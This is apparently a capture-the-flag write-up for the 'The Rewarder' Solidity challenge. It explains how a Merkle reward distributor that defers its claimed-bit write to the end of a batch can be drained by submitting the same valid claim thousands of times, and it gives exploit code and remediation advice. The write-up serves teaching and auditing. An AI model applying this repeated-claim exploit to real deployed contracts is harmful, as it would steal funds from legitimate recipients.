# 05 — The Rewarder

**Class:** Broken idempotency in a batch claim (double-spend via delayed state
write)
**Goal:** Drain almost all remaining DVT and WETH from a Merkle-based distributor
to the recovery account (a little dust is tolerated).

## The setup

`TheRewarderDistributor` pays rewards proven by Merkle proofs and tracks who has
claimed using a per-claimer **bitmap**. `claimRewards` accepts a *batch* of claims
across multiple tokens in one call, accumulating amounts per token before writing
the "claimed" bit.

The player is one of the 1000 legitimate beneficiaries and holds a valid proof for
a modest amount in each distribution.

## Root cause

Look at the batching logic:

```solidity
for (uint256 i = 0; i < inputClaims.length; i++) {
    ...
    if (token != inputTokens[inputClaim.tokenIndex]) {
        if (address(token) != address(0)) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
        token = inputTokens[inputClaim.tokenIndex];
        bitsSet = 1 << bitPosition;
        amount  = inputClaim.amount;
    } else {
        bitsSet |= 1 << bitPosition;
        amount  += inputClaim.amount;
    }
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }
    // ...verify proof...
    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount); // EVERY iteration
}
```

The **transfer happens on every iteration**, but `_setClaimed` — which marks the
bitmap and decrements `remaining` — only runs when the token *changes* or on the
last claim. The proof check merely re-verifies the *same* valid leaf each time; it
does not consult "already claimed" state.

So if you submit the same valid claim `N` times contiguously (same token, same
batch, same amount), you receive the reward `N` times while the bitmap is written
**once**. The bit `1 << bitPosition` OR'd with itself is idempotent, so the single
final `_setClaimed` succeeds — the contract believes you claimed exactly once.

## Exploit

For each token, repeat the player's own valid claim `remaining / amount` times
(floor division keeps `remaining -= amount` from underflowing on the single
`_setClaimed`), grouped per token so the state write fires once per token:

```solidity
uint256 dvtRepeat  = distributor.getRemaining(address(dvt))  / dvtAmount;
uint256 wethRepeat = distributor.getRemaining(address(weth)) / wethAmount;

Claim[] memory claims = new Claim[](dvtRepeat + wethRepeat);
for (uint256 i = 0; i < dvtRepeat;  i++) claims[i]            = Claim(0, dvtAmount,  0, dvtProof);
for (uint256 i = 0; i < wethRepeat; i++) claims[dvtRepeat+i]  = Claim(0, wethAmount, 1, wethProof);

distributor.claimRewards(claims, tokens);   // ~8000 transfers, one bitmap write per token
// then sweep the drained balances to recovery
```

## Remediation

- **Mark-before-pay, per claim.** Check and set the claimed bit *before* each
  transfer, inside the same iteration — never defer state to the end of a batch.
- Make `_setClaimed` reject a bit that's already set for *that individual* claim,
  and decrement `remaining` per claim, so repetition within a batch fails
  immediately with `AlreadyClaimed`.
- Prefer the well-trodden Merkle-distributor pattern (e.g. Uniswap's
  `MerkleDistributor`) that sets `isClaimed[index]` atomically with the payout.

## Real-world parallel

"State update deferred outside the effect loop" is a recurring audit finding in
airdrop/reward distributors and batch processors — any place where checks-effects
are hoisted out of the per-item loop for gas, breaking idempotency.
